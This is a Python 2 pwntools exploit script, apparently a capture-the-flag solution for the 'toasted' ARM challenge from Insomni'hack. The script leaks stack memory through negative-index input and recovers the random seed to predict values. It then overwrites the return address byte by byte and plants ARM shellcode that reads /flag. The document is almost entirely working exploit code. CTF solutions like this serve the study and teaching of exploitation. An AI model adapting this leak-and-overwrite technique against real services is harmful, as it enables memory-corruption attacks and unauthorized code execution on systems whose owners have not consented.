#!/usr/bin/env python
from pwnlib.tubes import *
from time import sleep
from struct import pack

ret_address_offset = 0x54

def main():
    p = None

    #
    # Start the service locally
    #
    p = process.process(["qemu-arm", "toasted"])
    #p = remote.remote('toasted.insomnihack.ch', 7200, ssl=False)
    #p = remote.remote('localhost', 7200, ssl=False)
    #p = process.process(["qemu-arm", "-g", "1234", "toasted"])

    #
    # Login to the service
    #
    passphrase = "How Large Is A Stack Of Toast?\x0a"

    p.recvuntil("Passphrase : ")#timeout=0.5)

    p.send_raw(passphrase)

    #
    # Enable the debugging information by setting a non-zero value to i_show_status local variable.
    #
    p.recvuntil("?")#timeout=0.5)
    p.send("-64") # 

    #
    # Move the buffer pointer so we can leak the stack content
    #
    p.recvuntil("to heat?") # discard the buffer output right now
    p.send("-60") # 

    # Read the leaked debug output to get the internal information.
    data = p.recvuntil("to heat?")
    stack = parse_leaked_data_matrix(data)

    # Checking known ret address
    try:
        if stack[ret_address_offset / 4] != 0x8c93:
            print "[-] Buffer pointer was incorrectly modified... quitting."
            print "TIP : You should give this another try until you're lucky ;)"
            return False

    except IndexError, err:
            print "[-] Malformed input data... quitting."
            return False
    
    seed = stack[(ret_address_offset + 0xC) / 4]
    print "[+] seed is 0x%08X from /dev/urandom" % seed

    stack_base_address = stack[(ret_address_offset - 4) / 4] & 0xFFFFFF00
    print "[+] Stack base is 0x%08X" % stack_base_address

    # Generate future random values based on the leaked seed.
    values = get_seeded_values(seed, 100000)

    perform_attack_plan(values, p, stack_base_address)

    print "[+] Reading file content of '/flag'"
    print p.recvall()
    return True

def perform_attack_plan(values, proc, stack_base_address):
    """Verify that we can deploy shellcode with predicted random values and do so."""

    shellcode = ""
    shellcode += "\x07\xa0\x00\x21\x05\x27\x00\xdf\x06\x1c\x69\x46\x80\x22\x03\x27"
    shellcode += "\x00\xdf\x01\x20\x04\x27\x00\xdf\x01\x27\x00\xdf\xc0\x46\xc0\x46"
    shellcode += "\x2f\x66\x6c\x61\x67\x00\xc0\x46\xc0\x46\xc0\x46\xc0\x46\xc0\x46"

    #
    # Deploy shellcode based on predicted values.
    #
    try_counter_patched = False
    ret_address_patched = 0
    ret_address_fixed = 0

    values = values[3 : ]   # Discard the first two values because they've 
                            # been used already for the memory leak trick.

    try_counter_offset = ret_address_offset - 0x10
    shellcode_offset = ret_address_offset + 0x10
    new_ret_address = list(pack("<I", stack_base_address + shellcode_offset + 1))

    shellcode = list(shellcode)
    sc_count = 0
    i = 0

    print "[+] Deploying shellcode..."
    while len(shellcode) != sc_count or \
        not try_counter_patched or \
        ret_address_patched < 4 or \
        ret_address_fixed < 2:

        v = values[0]
        values = values[1:]
        #print "[+] Next random char : 0x%02X (%r)" % (ord(v), v)
    
        if not try_counter_patched and ord(v) & 0x80:
            print "[+] Patching try counter to achieve near-infinite writes."
            proc.send("%03d" % (try_counter_offset + 3))
            proc.recvuntil("to heat?")
            try_counter_patched = True

        #
        # We need to patch the two lower bytes but given that we're working on a little endian
        # architecture we must write over the first two bytes.
        #
        elif ret_address_fixed < 2 and ord(v) > 0xC0: # value high enought to wrap and force an
                                                        # an 'overheat' making the process to write
                                                        # a 0x00 at that address
            print "[+] Clearing return address (byte %d of 2)." % (ret_address_fixed + 1)
            proc.send("%03d" % (ret_address_offset + ret_address_fixed))
            proc.recvuntil("to heat?")
            ret_address_fixed += 1

        elif ret_address_patched < 4 and v in new_ret_address:
            print "[+] Writing return address (byte %d of 4)." % (ret_address_patched + 1)
            pos = new_ret_address.index(v)
            new_ret_address[pos] = None
            proc.send("%03d" % (ret_address_offset + pos))
            proc.recvuntil("to heat?")
            ret_address_patched += 1
            continue # Cannot reuse this byte.

        else:
            #
            # All conditions are met so we proceed to write the shellcode right after the 
            # ret address.
            #
            try:
                pos = shellcode.index(v)
                shellcode[pos] = None   # Avoid toaster overheat if re-written.
                sc_count += 1           # Keep track of written bytes

                #print "[-] Writing shellcode byte (%d remain)" % sc_count

                proc.send("%03d" % (shellcode_offset + pos))
                proc.recvuntil("to heat?")
            except ValueError, err:
                if not i % 1000:
                    print "[+] Dummy bytes so far : %d" % i
                i += 1
                proc.send("%03d" % 0) # This address is overwritten when stack 
                                        # decreases and there is always a zero
                proc.recvuntil("to heat?")

    print "[+] Deployment complete. Ready to trigger..."
    proc.send("q") # Trigger the attack

def get_seeded_values(seed, n):
    """Return a list of N 'radom' values based on the specified seed."""
    r = process.process(["/home/oem/projects/ctf/insomni/toaster/not_so_random", str(seed), str(n)])

    values = list()

    print "[+] Generating seeded random values."
    for l in r.recvlines(n):
        val = int(l.split(" : ")[1], 16) & 0xFF # Only keep the lower value.
        values.append(chr(val))

    print "[+] Successfully obtained %d seeded 'random' values" % len(values)
    return values
    
def parse_leaked_data_matrix(data):
    """Parse the leaked debug information from the toaster for further usage."""
    stack = list()

    print "[+] Leaked data dump:"
    for l in data.splitlines():
        # Filter unwanted data from the toaster output.
        if len(l) < 10 or l[0] != "[":
            #print "=======>>> %r" % l
            continue

        print "\t",
        # Remove characters to ease parsing.
        l = l[1:-1].split("][")

        #print l
        for i in xrange(0, len(l), 4):
            cur_val = l[i : i+4]
            cur_val.reverse() 
            cur_val = "".join(["%02X" % int(x) for x in cur_val])
            cur_val = int(cur_val, 16)

            stack.append(cur_val)

            print "0x%08X" % cur_val, 

        print ""
    
    return stack

if __name__ == "__main__":
    main()
